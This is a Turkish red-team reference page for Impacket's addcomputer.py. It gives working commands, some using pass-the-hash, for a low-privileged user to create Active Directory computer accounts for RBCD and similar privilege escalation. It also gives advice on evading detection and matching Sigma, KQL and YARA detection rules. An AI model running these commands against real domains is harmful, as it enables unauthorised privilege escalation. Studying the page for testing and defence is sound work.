# impacket-addcomputer

> **Kategori:** [9. ACL, GPO VE NESNE MANİPÜLASYONU (OBJECT, ACL & DELEGATION ABUSE)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Alberto Solino (@agsolino) ve Impacket geliştiricileri tarafından hazırlanan; Active Directory ortamlarında standart kullanıcılara tanınan `ms-DS-MachineAccountQuota` (MAQ) hakkını veya yönetici ayrıcalıklarını kullanarak, hem LDAP/LDAPS hem de SMB/SAMR protokolü üzerinden uzaktan etki alanına yeni bilgisayar hesapları ekleyen (`-method LDAP / SAMR`) ve gerektiğinde silen (`-delete`) temel komut satırı aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında kırmızı takım operatörlerinin en sık başvurduğu yetki yükseltme tekniklerinin başında Resource-Based Constrained Delegation (RBCD), Shadow Credentials, AD CS (ESC8) sertifika relay saldırıları ve sAMAccountName Spoofing (noPac) gelir. Bu saldırıların ortak paydası, saldırganın etki alanında kendi kontrolünde olan ve geçerli bir Service Principal Name (SPN) barındıran bir **bilgisayar hesabına (`Computer$`)** ihtiyaç duymasıdır.

Varsayılan Active Directory yapılandırmasında (`ms-DS-MachineAccountQuota = 10`), herhangi bir düşük yetkili domain kullanıcısı etki alanına 10 adede kadar yeni bilgisayar hesabı ekleyebilir. Linux tabanlı saldırı platformlarında bu kotayı sömürerek bilgisayar hesabı açmanın en kararlı, esnek ve endüstri standardı aracı **`impacket-addcomputer` (addcomputer.py)**'dir.

### Çift Protokol Mimarisi (Dual-Protocol Architecture)

`addcomputer.py`, bilgisayar hesabı oluştururken iki farklı protokol yöntemini destekler:

1. **LDAP / LDAPS Yöntemi (`-method LDAP` - Varsayılan):**
   - Doğrudan Etki Alanı Denetleyicisinin Dizin Hizmetine (TCP 389 veya SSL ile TCP 636) bağlanır.
   - `computer` nesne sınıfı ile bir LDAP `AddRequest` gönderir.
   - `sAMAccountName`, `userAccountControl` (`0x1000 = WORKSTATION_TRUST_ACCOUNT`), `unicodePwd`, `servicePrincipalName` (`HOST/<FQDN>`, `RestrictedKrbHost/<FQDN>`) ve `dNSHostName` özniteliklerini otomatik olarak yapılandırır.
   - **Avantajı:** SMB servisine dokunmaz; dosya paylaşım filtrelerini ve SMB izleme sistemlerini tamamen atlatır.
2. **SAMR Yöntemi (`-method SAMR`):**
   - SMB (TCP 445) üzerinden `\pipe\samr` Adlandırılmış Borusuna (Named Pipe) bağlanarak Güvenlik Hesap Yöneticisi Uzak Protokolü'nü (MS-SAMR) kullanır.
   - `SamrConnect`, `SamrOpenDomain`, `SamrCreateUser2InDomain` ve `SamrSetInformationUser2` RPC çağrılarıyla makine hesabını oluşturur.
   - **Avantajı:** LDAP erişiminin güvenlik duvarı veya kurumsal politikalarla engellendiği durumlarda SMB üzerinden makine açma esnekliği sunar.

### Temizlik Mekanizması (`-delete`)

Bir sızma testinde açılan bilgisayar hesaplarının test bitiminde etki alanında kalması ciddi bir güvenlik zafiyeti ve izdir. `addcomputer.py`, `-delete` parametresi ile oluşturulan bilgisayar hesabını LDAP `DeleteRequest` veya SAMR `SamrDeleteUser` çağrısıyla tamamen kaldırarak kusursuz bir iz temizliği (Rollback) sağlar.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   SALDIRGAN LINUX PLATFORMU (IMPACKET)                 │
│                                                                        │
│  [ addcomputer.py -computer-name 'ATTACKPC01$'                         │
│                   -computer-pass 'ComplexPass2026!'                    │
│                   -dc-ip 10.10.10.1 corp.local/jdoe:Pass123 ]          │
│         │                                                              │
│         ├── (1) Yöntem Seçimi: LDAP (TCP 389/636) veya SAMR (TCP 445) │
│         │                                                              │
│         ├── (2) LDAP AddRequest veya SamrCreateUser2 Gönderilir:       │
│         │       dn: CN=ATTACKPC01,CN=Computers,DC=corp,DC=local        │
│         │       sAMAccountName: ATTACKPC01$                            │
│         │       userAccountControl: 4096 (WORKSTATION_TRUST_ACCOUNT)   │
│         │       unicodePwd: "ComplexPass2026!"                         │
│         │       SPN: HOST/ATTACKPC01, HOST/ATTACKPC01.corp.local       │
│         │                                                              │
│         ▼                                                              │
│  [ DOMAIN CONTROLLER (NTDS.DIT) ] ──► Makine Hesabı Oluşturuldu        │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: ATTACKPC01$ Hesabı RBCD ve ESC8 İçin Kullanıma Hazır! ]     │
│         │                                                              │
│         └── (3) Test Bittiğinde İz Temizliği:                          │
│                 addcomputer.py ... -delete -computer-name 'ATTACKPC01$'│
│                 └── Nesne Dizin Veritabanından Tamamen Silinir         │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | Windows Araçları (net.exe / RSAT) | impacket-addcomputer |
|---|---|---|
| **Yönetici Hakları Şartı**| `net computer /add` yerel yönetici veya Domain Admin hakkı arar. | Standart `Domain Users` yetkisiyle MAQ üzerinden makine açar. |
| **İşletim Sistemi** | Windows uç noktası zorunludur. | Linux saldırı makinesinden doğrudan ağ üzerinden çalışır. |
| **Protokol Esnekliği** | Yalnızca Windows iç API'lerini kullanır. | Hem **LDAP** hem de **SAMR** yöntemleri arasında geçiş yapabilir. |
| **Pass-the-Hash Desteği**| Desteklemez (Açık parola gerekir). | `-hashes :NT_HASH` ile Pass-the-Hash doğrudan desteklenir. |
| **Otomatik SPN Üretimi**| Manuel SPN tanımlamayı gerektirebilir. | `HOST/` ve `RestrictedKrbHost/` SPN'lerini otomatik inşa eder. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | impacket-addcomputer | PowerMad | bloodyAD | StandIn |
|---|---|---|---|---|
| **Geliştirme Dili** | Python 3 (Impacket) | PowerShell (.NET) | Python 3 | C# (.NET) |
| **Çalışma Platformu** | Linux / macOS / Windows | Windows Yerel | Linux / macOS / Windows | Windows (Yerel) |
| **SAMR Yöntemi Desteği**| 🟢 Var (`-method SAMR`) | 🔴 Yok (Salt LDAP) | 🔴 Yok (Salt LDAP) | 🟢 Var |
| **LDAPS (SSL) Desteği** | 🟢 Var (`-use-ldaps`) | 🟢 Var | 🟢 Var (`-s`) | 🟢 Var |
| **Hesap Silme (-delete)**| 🟢 Yerleşik Tek Bayrak | 🟡 Salt Disable | 🟢 Var (`remove`) | 🟡 Kısıtlı |
| **Pass-the-Hash Desteği**| 🟢 Yerleşik (`-hashes`) | 🔴 Yok | 🟢 Yerleşik (`--hashes`)| 🔴 Yok |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

addcomputer.py, makine kimlik bilgilerini, oluşturulacak makine adını/parolasını ve bağlantı protokolünü parametre olarak alır.

### Genel Sözdizimi

```bash
python3 addcomputer.py [Seçenekler] -computer-name <MAKİNE_ADI>$ [Kimlik Bilgisi]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `-computer-name AD$` | Oluşturulacak veya silinecek bilgisayar hesabının adı (Sonunda `$` olmalıdır). | `-computer-name 'EVILPC01$'` |
| `-computer-pass PAROLA` | Oluşturulan makine hesabına atanacak parola (Belirtilmezse rastgele üretilir). | `-computer-pass 'ComplexPass2026!'` |
| `-computer-group DN` | Makine hesabının oluşturulacağı hedef OU'nun Distinguished Name yolu (Varsayılan: `CN=Computers`). | `-computer-group "OU=Workstations,DC=corp,DC=local"` |
| `-method YÖNTEM` | Kullanılacak protokol yöntemi: `LDAP` (varsayılan) veya `SAMR`. | `-method SAMR` |
| `-delete` | Belirtilen bilgisayar hesabını etki alanından tamamen siler. | `-delete -computer-name 'EVILPC01$'` |
| `-dc-ip IP` | Hedef Etki Alanı Denetleyicisinin IP adresi. | `-dc-ip 10.10.10.1` |
| `-use-ldaps` | LDAP bağlantısını TLS şifreli (Port 636) üzerinden gerçekleştirir. | `-use-ldaps` |
| `-hashes LM:NT` | Parola yerine NTLM parola karması ile Pass-the-Hash kimlik doğrulaması. | `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` |
| `-k` | Parola yerine Kerberos bilet önbelleğini (`KRB5CCNAME`) kullanır. | `-k -no-pass` |
| `-no-pass` | Parola sorma işlemini atlar (Hash veya Kerberos ile kullanılır). | `-no-pass` |
| `-port PORT` | Özel bir LDAP veya SMB portu tanımlar (Örn: 3268 Global Catalog). | `-port 636` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Kullanıcı ile LDAP Üzerinden Yeni Bilgisayar Hesabı Açma

Düşük yetkili bir etki alanı kullanıcısı (`jdoe`) ile MAQ kotasından yararlanarak RBCD saldırısında kullanılmak üzere `ATTACKPC$` makinesi oluşturmak:

```bash
python3 addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'PwnMachine2026!' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```

**Örnek Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully bound to LDAP server 10.10.10.1:389
[*] Target container: CN=Computers,DC=corp,DC=local
[*] Adding new computer account 'ATTACKPC$'...
[*] Attributes set:
  sAMAccountName        : ATTACKPC$
  userAccountControl    : 4096 (WORKSTATION_TRUST_ACCOUNT)
  dNSHostName           : ATTACKPC.corp.local
  servicePrincipalName  : HOST/ATTACKPC, HOST/ATTACKPC.corp.local, RestrictedKrbHost/ATTACKPC
[+] Successfully added computer account 'ATTACKPC$'!
[+] Machine password is: PwnMachine2026!
```

*Çıktı Yorumu:* `ATTACKPC$` hesabı başarıyla oluşturulmuş ve Kerberos yetki devri için gerekli `HOST/` SPN'leri otomatik olarak atanmıştır.

### Senaryo 2: SAMR Yöntemi ile SMB Üzerinden Bilgisayar Hesabı Oluşturma

LDAP portlarının izlendiği veya güvenlik duvarı ile kısıtlandığı ortamlarda SMB (Port 445) üzerinden MS-SAMR protokolü ile makine açmak:

```bash
python3 addcomputer.py -method SAMR -computer-name 'SAMRPC$' -computer-pass 'SamrPass#2026' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```

Bu yöntem, `\pipe\samr` üzerinden `SamrCreateUser2InDomain` çağrısı yaparak Windows yerel kullanıcı yöneticisi mantığıyla hesabı açar.

### Senaryo 3: Pass-the-Hash ile Makine Hesabı Ekleme

Parola bilinmediğinde ele geçirilen NTLM hash ile makine açma:

```bash
python3 addcomputer.py -computer-name 'HASHPWNPC$' -computer-pass 'NewPass#123' -hashes :7a1029384bfe2109384729102834bfa1 -dc-ip 10.10.10.1 'corp.local/svc_backup'
```

### Senaryo 4: Belirli Bir OU Altında Bilgisayar Hesabı Oluşturma

Sistem yöneticilerinin `CN=Computers` altını denetlediği ortamlarda, makineyi meşru bir çalışma istasyonu OU'su altında gizleyerek açmak:

```bash
python3 addcomputer.py -computer-name 'PC-FINANCE-04$' -computer-pass 'FinPass2026!' -computer-group "OU=Finance,OU=Workstations,DC=corp,DC=local" -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```

### Senaryo 5: Operasyon Sonrası Eklenen Hesabı Güvenle Silme (Temizlik)

Sızma testi tamamlandığında veya yetki yükseltme sağlandığında açılan makine hesabını etki alanından tamamen kaldırmak:

```bash
python3 addcomputer.py -delete -computer-name 'ATTACKPC$' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```

**Örnek Konsol Çıktısı:**

```text
[*] Successfully bound to LDAP server 10.10.10.1:389
[*] Deleting computer account 'CN=ATTACKPC,CN=Computers,DC=corp,DC=local'...
[+] Successfully deleted computer account 'ATTACKPC$'!
```

### Senaryo 6: Kerberos Bilet Önbelleği (.ccache) ile Parolasız Makine Ekleme

Önceden elde edilmiş bir TGT biletini kullanarak ağda parola izi bırakmadan makine açmak:

```bash
export KRB5CCNAME=/tmp/jdoe.ccache
python3 addcomputer.py -k -no-pass -computer-name 'KERBPC$' -computer-pass 'KrbPass2026!' -dc-ip 10.10.10.1 'corp.local/jdoe'
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `LDAP: error code 53 - 0000216D: SvcErr: DSID-031A11EF` / MachineAccountQuota exceeded | Mevcut kullanıcı daha önce 10 adet bilgisayar hesabı oluşturmuş ve MAQ limitini doldurmuştur ya da yöneticiler kotayı `0` yapmıştır. | Farklı bir kullanıcı hesabına geçilmeli veya daha önce oluşturulup kullanılmayan bir makine hesabı `-delete` ile silinip yer açılmalıdır. Kota 0 ise bu teknik çalışmaz. |
| `LDAP: error code 19 - 0000052D: Constraint violation` / Password policy error | `-computer-pass` bayrağında belirtilen parola, etki alanının asgari parola uzunluğu veya karmaşıklık kurallarını karşılamamaktadır. | Çok daha uzun (16+ karakter), büyük-küçük harf, rakam ve sembol içeren karmaşık bir parola tanımlanmalıdır. |
| `SAMR: STATUS_ACCESS_DENIED (0xC0000022)` | Kullanıcının SAMR arabirimi üzerinden makine oluşturma yetkisi kısıtlanmıştır veya SMB paylaşım erişimi engellenmiştir. | `-method SAMR` yerine varsayılan `-method LDAP` tercih edilmelidir. |
| `LDAP: error code 68 - Entry already exists` | Belirtilen `-computer-name` adında bir bilgisayar hesabı etki alanında zaten mevcuttur. | Benzersiz ve daha önce kullanılmamış rastgele bir makine adı (Örn: `WKS-TEMP-9841$`) seçilmelidir. |
| `Kerberos clock skew error (KRB_AP_ERR_SKEW)` | Linux makinesinin sistem saati ile etki alanı denetleyicisi saati arasında 5 dakikadan fazla fark vardır. | Saat senkronize edilmelidir: `sudo ntpdate 10.10.10.1` veya `sudo rdate -n 10.10.10.1`. |
| `LDAPSocketOpenError: Connection refused on port 389` | DC üzerindeki düz metin LDAP servisi kapalıdır veya güvenlik duvarı tarafından engellenmektedir. | `-use-ldaps` bayrağı eklenerek TLS şifreli LDAPS (Port 636) üzerinden bağlanılmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Portları ]     : 🟢 MİNİMAL (LDAP TCP 389/636 veya SMB TCP 445) │
│  [ DC Olay Günlüğü ] : 🔴 YÜKSEK (Event 4741 Makine Oluşturma Olayı)  │
│  [ Silme Günlüğü ]   : 🟡 ORTA (Event 4743 Makine Silme Olayı)         │
│  [ EDR Uç Nokta İzi ]: 🟢 SIFIR (Uç noktalarda süreç çalışmaz)        │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Güvenlik Günlükleri (Security Log):**
   - **Event ID 4741 (A computer account was created):**
     - `SubjectUserName`: Makineyi oluşturan kullanıcı (Örn: `CORP\jdoe`).
     - `TargetUserName`: Yeni oluşturulan makine hesabı (`ATTACKPC$`).
     - **Kritik SIEM Tespit Mantığı:** Standart bir etki alanı kullanıcısının (`Domain Users`) yeni bir bilgisayar hesabı oluşturması SIEM'lerde doğrudan yüksek öncelikli alarm kaynağıdır.
   - **Event ID 4742 (A computer account was changed):** Makine hesabına SPN veya DNS adı eklendiğinde tetiklenir.
   - **Event ID 4743 (A computer account was deleted):** `-delete` komutu çalıştırıldığında tetiklenir.
2. **Ağ Telemetrisi:**
   - Dizin sunucusuna gönderilen `AddRequest` paketinde `objectClass: computer` bulunması.

### 5.2 Ağ ve EDR İmzaları

- **İstemci Parmak İzi:** Impacket LDAP ve SMB motoru tarafından üretilen TCP bağlantı paketlerindeki karakteristik ASN.1 kodlamaları.
- **Davranışsal Anomali:** Bir iş istasyonundan etki alanına katılım (Join Domain) yapılmaksızın doğrudan ağ seviyesinden makine hesabı oluşturulması.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1136.002** | Create Account: Domain Account | MAQ kotası kullanılarak yetkisiz bilgisayar hesabı oluşturulması. |
| **T1098** | Account Manipulation | Bilgisayar hesabı özniteliklerinin (SPN, DNSHostName) atanması. |
| **T1078.002** | Valid Accounts: Domain Accounts | Oluşturulan makine hesabı ile Kerberos kimlik doğrulaması yapılması. |
| **T1558.002** | Kerberos Ticket Granting Service: S4U Abuse | RBCD saldırısı için aracı makine hesabı sağlanması. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Event 4741 Tetiklenmesi** | Makine oluşturma eylemini mesai saatleri içinde ve mümkünse meşru bir BT destek personeli veya servis hesabı oturumu üzerinden gerçekleştirin. |
| **Şüpheli Makine Adları** | `PWNPC$`, `ATTACK$` gibi isimler asla kullanılmamalıdır; kurumun meşru isimlendirme şablonu (Örn: `WKS-IST-9124$`) taklit edilmelidir. |
| **Düz Metin LDAP Dinlemesi** | Ağ izleme ve NIDS cihazlarından kaçınmak için her zaman `-use-ldaps` (Port 636) bayrağını kullanın. |
| **Kalıcı Nesne İzi** | Sömürü tamamlandığında eklenen makine hesabı mutlaka `-delete` bayrağı ile silinmeli; etki alanında artık nesne bırakılmamalıdır. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Standart Kullanıcı Tarafından Bilgisayar Hesabı Oluşturulması Tespiti

```yaml
title: Computer Account Created by Non-Admin User (Impacket addcomputer)
id: c71248a1-4912-4c20-a912-48910245fe01
status: experimental
description: Detects the creation of a computer account by an unprivileged user, characteristic of impacket-addcomputer or PowerMad.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4741
  filter_admins:
    SubjectUserName|endswith: '$' # Makine hesapları
    SubjectUserName|contains:
      - 'admin'
      - 'da_'
      - 'svc_'
  condition: selection and not filter_admins
falsepositives:
  - Legitimate self-service domain join or Intune provisioning by authorized users
level: high
tags:
  - attack.persistence
  - attack.t1136.002
```

#### Microsoft Sentinel KQL Sorgusu: Hızlı Makine Oluşturma ve Silme Döngüsü

```kql
// 30 dakika içinde bir bilgisayar hesabı oluşturulup (4741) ardından silinmesi (4743) - Sömürü ve Temizlik İmzası
let CreatedMachines = SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID == 4741
| extend EventDataXML = parse_xml(EventData)
| extend MachineName = tostring(EventDataXML.EventData.Data[0])
| extend Creator = tostring(EventDataXML.EventData.Data[4])
| project CreateTime = TimeGenerated, Creator, MachineName;
let DeletedMachines = SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID == 4743
| extend EventDataXML = parse_xml(EventData)
| extend MachineName = tostring(EventDataXML.EventData.Data[0])
| project DeleteTime = TimeGenerated, MachineName;
CreatedMachines
| join kind=inner (DeletedMachines) on MachineName
| where DeleteTime between (CreateTime .. (CreateTime + 30m))
| project CreateTime, DeleteTime, Creator, MachineName
```

#### YARA Kuralı: Impacket addcomputer.py Script İmzaları

```yara
rule PostExploit_Impacket_AddComputer {
    meta:
        description = "Detects Impacket addcomputer.py machine account creation tool"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "addcomputer.py" ascii
        $s2 = "WORKSTATION_TRUST_ACCOUNT" ascii
        $s3 = "-computer-name" ascii
        $s4 = "-computer-pass" ascii
        $s5 = "impacket.ldap" ascii
        $s6 = "SamrCreateUser2InDomain" ascii
    condition:
        all of ($s1, $s3, $s4) or (3 of ($s2, $s3, $s5, $s6))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Standart Kullanıcı ile Yeni Bilgisayar Hesabı Açma (LDAP)
```bash
python3 addcomputer.py -computer-name 'WKS-TEMP-01$' -computer-pass 'ComplexPass#2026!' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```
- **Ne Yapar?** Standart kullanıcı kotasını kullanarak etki alanına yeni bir bilgisayar hesabı ekler.
- **Ne Zaman Kullanılır?** RBCD, Shadow Credentials veya makine sertifikası saldırılarında aracı hesap gerektiğinde.
- **Parametreler:** `-computer-name`: Makine adı (`$` ile biten), `-computer-pass`: Belirlenen parola.

### Komut 2: SAMR Yöntemi ile SMB Üzerinden Makine Hesabı Ekleme
```bash
python3 addcomputer.py -method SAMR -computer-name 'SAMRPC$' -computer-pass 'SamrPass#2026' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```
- **Ne Yapar?** LDAP yerine SMB (TCP 445) ve MS-SAMR RPC arabirimi üzerinden bilgisayar hesabı açar.
- **Ne Zaman Kullanılır?** LDAP portu filtrelendiğinde veya kurumsal izleme LDAP'a odaklandığında.
- **Parametreler:** `-method SAMR`: SAMR RPC yöntemi.

### Komut 3: Pass-the-Hash ile Makine Hesabı Ekleme
```bash
python3 addcomputer.py -computer-name 'HASHPWNPC$' -computer-pass 'NewPass#123' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 10.10.10.1 'corp.local/svc_backup'
```
- **Ne Yapar?** Parola bilmeden doğrudan NTLM hash ile kimlik doğrulayıp makine hesabı oluşturur.
- **Ne Zaman Kullanılır?** Yalnızca parola karması ele geçirildiğinde.
- **Parametreler:** `-hashes`: LM:NT parola karması formatı.

### Komut 4: Oluşturulan Bilgisayar Hesabını Etki Alanından Silme (Temizlik)
```bash
python3 addcomputer.py -delete -computer-name 'WKS-TEMP-01$' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```
- **Ne Yapar?** Daha önce açılan makine hesabını etki alanı veritabanından tamamen siler.
- **Ne Zaman Kullanılır?** Sızma testi tamamlandığında izleri temizlemek ve geride artık hesap bırakmamak için.
- **Parametreler:** `-delete`: Silme eylemi.

### Komut 5: Belirli Bir OU Altında Bilgisayar Hesabı Açma
```bash
python3 addcomputer.py -computer-name 'LPT-SALES-99$' -computer-pass 'Pass123!' -computer-group "OU=Laptops,DC=corp,DC=local" -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```
- **Ne Yapar?** Hesabı `CN=Computers` yerine belirtilen kurumsal OU konteyneri içine oluşturur.
- **Ne Zaman Kullanılır?** Sistem yöneticilerinin dikkatini çekmemek ve normal kullanıcı cihazı gibi gizlenmek için.
- **Parametreler:** `-computer-group`: Hedef OU Distinguished Name yolu.

### Komut 6: Şifreli LDAPS Bağlantısı Zorlama (Port 636)
```bash
python3 addcomputer.py -use-ldaps -computer-name 'SECUREPC$' -computer-pass 'Pass123!' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```
- **Ne Yapar?** LDAP işlemlerini TCP 636 üzerinden TLS şifreli olarak yürütür.
- **Ne Zaman Kullanılır?** Ağ izleme sistemlerinden kaçınmak ve LDAP imzalama zorunluluğunu aşmak için.
- **Parametreler:** `-use-ldaps`: Güvenli soket bağlantısı.

### Komut 7: Kerberos Bileti ile Parolasız Makine Ekleme
```bash
export KRB5CCNAME=jdoe.ccache && python3 addcomputer.py -k -no-pass -computer-name 'KERBPC$' -computer-pass 'KrbPass2026!' -dc-ip 10.10.10.1 'corp.local/jdoe'
```
- **Ne Yapar?** Kerberos TGT önbelleğini kullanarak parola girmeden makine hesabı oluşturur.
- **Ne Zaman Kullanılır?** Parola izi bırakmamak ve Kerberos ortamlarında çalışmak için.
- **Parametreler:** `-k`: Kerberos kullan, `-no-pass`: Parola sorma.

### Komut 8: Rastgele Parola ile Makine Oluşturma
```bash
python3 addcomputer.py -computer-name 'RANDOMPC$' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```
- **Ne Yapar?** Parola belirtilmediğinde güçlü ve rastgele bir parola türeterek makineyi açar ve ekrana basar.
- **Ne Zaman Kullanılır?** Hızlıca geçici bir hesap açmak gerektiğinde.
- **Parametreler:** `-computer-pass` bayrağı verilmez.

### Komut 9: SAMR Üzerinden Makine Hesabı Silme
```bash
python3 addcomputer.py -method SAMR -delete -computer-name 'SAMRPC$' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!'
```
- **Ne Yapar?** SMB ve MS-SAMR arabirimi üzerinden makine hesabını siler.
- **Ne Zaman Kullanılır?** SAMR yöntemiyle açılan hesapları temizlerken.
- **Parametreler:** `-method SAMR -delete`: SAMR silme modu.

### Komut 10: Makine Açıp Ardından Doğrudan RBCD Tetikleme Zinciri
```bash
python3 addcomputer.py -computer-name 'EVILPC$' -computer-pass 'PwnPass123!' -dc-ip 10.10.10.1 'corp.local/jdoe:Welcome2026!' && python3 rbcd.py -delegate-to 'TARGETSRV$' -delegate-from 'EVILPC$' -action write -dc-ip 10.10.10.1 -u jdoe -p 'Welcome2026!'
```
- **Ne Yapar?** Önce aracı makineyi açar, hemen ardından hedef sunucuya RBCD hakkını enjekte eder.
- **Ne Zaman Kullanılır?** Tek satırda hızlı ve hatasız RBCD hazırlığı yapmak için.
- **Parametreler:** Komut zincirleme (`&&`).

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket (addcomputer.py)](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)
- **Kevin Robertson Araştırması:** [Exploiting MachineAccountQuota](https://www.netspi.com/)
- **Microsoft Dokümantasyonu:** [MS-SAMR: Security Account Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/)
- **MITRE ATT&CK Referansı:** [T1136.002 - Create Account: Domain Account](https://attack.mitre.org/techniques/T1136/002/)

---

> **Önceki:** [← impacket-rbcd](./impacket-rbcd.md) · **Sonraki:** [StandIn →](./StandIn.md)
